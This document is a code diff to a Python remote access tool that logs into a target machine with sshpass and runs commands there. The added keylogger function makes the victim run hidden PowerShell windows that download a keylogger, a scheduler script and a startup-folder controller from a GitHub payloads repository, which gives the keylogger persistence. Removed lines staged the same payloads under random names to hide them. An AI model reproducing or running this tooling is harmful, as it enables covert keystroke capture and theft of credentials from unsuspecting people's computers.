@@ -70,8 +70,8 @@ def read_config(config_file):
     read_lines = open(config_file, "r").readlines() #"r" is open in read mode, function just reads line of the config file 
     configuration["IPADDRESS"] = read_lines[0].strip()
     configuration["PASSWORD"] = read_lines[1].strip()
-    configuration["WORKINGDIRECTORY"] = read_lines[2].strip()
-    configuration["STARTUPDIRECTORY"] = read_lines[3].strip()
+    configuration["WORKINGDIRECTORY"] = (read_lines[2]).replace("\\", "/").strip()
+    configuration["STARTUPDIRECTORY"] = (read_lines[3]).replace("\\", "/").strip()
 
 
     return configuration
@@ -99,33 +99,18 @@ def remoteupload(address, password, upload_file, path):
 def remotedownload(address, password, download_file, path):
     os.system(f"sshpass -p \"{password}\" scp -r rat@{address}:{path} {local_path}")
 
+def remote_commands(address, password, command):
+    os.system(f"sshpass -p \"{password}\" ssh rat@{address} '{command}'")
 
+def keylogger(address, target_password, startup_dir, working_dir):
+    #web requests
+    keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/keylogger.ps1 -OutFile {working_dir}/keylogger.ps1\""
+    scheduler_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/l.ps1 -OutFile {working_dir}/l.ps1\""
+    controller_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/c.cmd -OutFile {startup_dir}/c.cmd\""
+    remote_commands(address, target_password, keylogger_command)
+    remote_commands(address, target_password, scheduler_command)
+    remote_commands(address, target_password, controller_command)
 
-def keylogger(address, target_password, working_dir, startup_dir):
-    keylogger = (f"{local_path}/payloads/keylogger.ps1")
-    controller = (f"{local_path}/payloads/c.cmd")
-    scheduler = (f"{local_path}/payloads/l.ps1")
-
-    # obfuscated files
-    obfuscated_controller = random_text() + ".cmd"
-    obfuscated_keylogger = random_text() + ".ps1"
-    obfuscated_scheduler = random_text() + ".ps1"
-
-    with open(obfuscated_controller, "w") as f:
-        f.write("@echo off")
-        f.write(f"powershell Start-Process powershell.exe -windowstyle hidden \"{working_dir}/\"")
-
-            
-
-    #file staging 
-    os.system(f"cp {controller} {local_path}/{obfuscated_controller}")
-    os.system(f"cp {keylogger} {local_path}/{obfuscated_keylogger}")
-    os.system(f"cp {scheduler} {local_path}/{obfuscated_scheduler}")
-
-    #remote upload
-    remoteupload(address, target_password, obfuscated_controller, startup_dir) #for controller
-    remoteupload(address, target_password, obfuscated_keylogger, working_dir) #for Keylogger
-    remoteupload(address, target_password, obfuscated_scheduler, working_dir) #for scheduler
 
 
 
@@ -161,7 +146,7 @@ def cli(arguments):
             connect(address, target_password)
 
         elif option == "1":
-            keylogger(address, target_password, working_dir, startup_dir)
+            keylogger(address, target_password, startup_dir, working_dir)
 
 
 
